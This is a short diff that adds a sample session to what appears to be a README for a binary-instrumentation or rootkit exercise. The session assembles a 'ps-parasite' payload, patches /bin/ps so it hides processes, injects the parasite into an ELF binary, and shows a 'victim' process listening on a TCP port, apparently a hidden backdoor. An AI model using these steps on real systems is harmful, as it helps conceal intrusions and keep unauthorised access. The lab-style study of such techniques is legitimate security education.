@@ -46,3 +46,20 @@ whoami
 admin
 exit
 ```
+
+## Sample Session (Bonus)
+
+```
+$ nasm -f bin -o ps-parasite.bin ps-parasite.s
+$ python3 ps-patch.py
+[*] Copying /bin/ps to [...]
+[*] Applying readproc patch at offset 0x2cf9
+[*] Applying readproctab2 patch at offset 0x2909
+[*] Done applying patches
+$ ./elfinject ps-modified ps-parasite.bin ".parasite" 0x800000 -1
+$ ./victim
+I'm a victim!
+$ netstat -ap tcp | grep victim
+tcp        0      0 *:19484    *:*    LISTEN    10662/victim 
+
+
